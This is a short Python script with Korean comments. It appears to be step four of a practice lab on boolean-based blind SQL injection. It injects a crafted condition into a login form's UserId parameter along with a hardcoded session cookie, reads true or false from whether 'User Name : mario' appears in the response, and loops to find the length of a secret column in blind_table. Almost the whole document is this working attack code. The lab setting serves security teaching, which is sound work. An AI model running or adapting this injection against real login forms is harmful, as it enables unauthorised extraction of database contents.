# step 4. 추출 글자 수 확인 함수 추가
import urllib.request
import urllib.parse
import re

def blindSqli(query):
	# 본인 실습 시스템의 URL 경로를 입력하세요!
	url = ""

	param = "' and {} and '1'='1".format(query)

	data = {'UserId': 'mario'+param,'Password':'mariosuper','Submit':'Login'}
	data = urllib.parse.urlencode(data).encode()
	cookie = 'PHPSESSID=nn91fov2c3j46bbaa9mb88qdft;'
	req = urllib.request.Request(url, data=data)
	
	req.add_header('cookie',cookie)

	response = urllib.request.urlopen(req)
	res_text = response.read().decode()

	chk = re.findall('User Name : mario', res_text)
	if(chk):
		return True
	else:
		return False


def check_length(sql_query):

	for i in range(0,20):
		query = "length((" + sql_query + ")) = " + str(i)
		res = blindSqli(query)

		if(res):
			return i

	return 0

sql_query = "select secret from blind_table limit 0,1"
print(check_length(sql_query))

